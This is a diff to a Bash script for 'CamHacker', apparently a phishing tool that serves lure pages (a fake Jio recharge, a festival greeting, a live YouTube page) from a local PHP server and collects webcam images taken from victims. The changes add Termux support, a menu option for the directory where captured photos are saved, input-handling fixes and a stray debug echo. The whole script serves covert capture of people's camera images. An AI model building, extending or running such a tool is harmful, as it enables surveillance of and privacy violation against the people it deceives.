@@ -27,6 +27,23 @@ ask="${cyan}[${white}?${cyan}] ${violate}"
 error="${cyan}[${white}!${cyan}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
 
+cwd=`pwd`
+
+if [[ -d /data/data/com.termux/files/home ]]; then
+termux-fix-shebang ch.sh
+termux=true
+else
+termux=false
+fi
+if $termux; then
+if ! [ -d /sdcard/Pictures ]; then
+cd /sdcard && mkdir Pictures
+fi
+export FOL="/sdcard/Pictures"
+else
+export FOL="$cwd"
+fi
+
 logo="
 ${green}  ____                _   _            _
 ${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
@@ -35,14 +52,7 @@ ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${blue}                                      [By KasRoudra]
 "
-options="${ask}Choose a option:
 
-${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
-${cyan}[${white}2${cyan}] ${yellow}Festival
-${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-${cyan}[${white}0${cyan}] ${yellow}Exit
-${cyan}[${white}x${cyan}] ${yellow}About${blue}
-"
 killer() {
 if [ `pidof php > /dev/null 2>&1` ]; then
     killall php
@@ -71,13 +81,7 @@ netcheck() {
         fi
     done
 }
-if [[ -d /data/data/com.termux/files/home ]]; then
-termux-fix-shebang ch.sh
-termux=true
-else
-termux=false
-fi
-cwd=`pwd`
+
 stty -echoctl
 trap "echo -e '${success}Thanks for using!\n'; exit" 2
 
@@ -183,7 +187,15 @@ while true; do
 clear
 echo -e "$logo"
 sleep 1
-echo -e "$options"
+echo -e "${ask}Choose a option:
+
+${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
+${cyan}[${white}2${cyan}] ${yellow}Festival
+${cyan}[${white}3${cyan}] ${yellow}Live Youtube
+${cyan}[${white}4${cyan}] ${yellow}Change Save Directory(current: ${red}${FOL})
+${cyan}[${white}0${cyan}] ${yellow}Exit
+${cyan}[${white}x${cyan}] ${yellow}About${blue}
+"
 sleep 1
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read option
@@ -197,20 +209,31 @@ read option
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
             sleep 1
+        else
+            fest_name="${fest_name//[[:space:]]/}"
             break
         fi
-        fest_name="${fest_name//[[:space:]]/}"
-        break
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID::${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
             sleep 1
+        else
             break
         fi
-        break
+    elif echo $option | grep -q "4"; then
+        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        read dire
+        if ! [ -d $dire ]; then
+            echo -e "\n${error}Invalid directory!\n\007"
+            sleep 1
+        else
+            export FOL="$dire"
+            echo -e "\n${success}Directory changed succesfully!\n"
+            sleep 1
+        fi
     elif echo $option | grep -q "0"; then   
         exit 0
     elif echo $option | grep -q "x"; then
@@ -230,6 +253,7 @@ read about
         sleep 1
     fi
 done
+cd $cwd
 if [ -e websites.zip ];then
 unzip websites.zip > /dev/null 2>&1
 rm -rf websites.zip
@@ -249,6 +273,7 @@ if $termux; then
     sleep 2
 fi
 sleep 1
+echo "5"
 echo -e "${info}Starting php server at localhost:7777....\n"
 netcheck
 php -S 127.0.0.1:7777 > /dev/null 2>&1 &
@@ -336,9 +361,9 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}Image downloaded! Check current directory!\n"
+        echo -e "\007${success}Image downloaded! Check directory!\n"
         file=`ls | grep png`
-        mv -f $file $cwd
+        mv -f $file $FOL
         rm -rf log.txt
     fi
     sleep 0.5
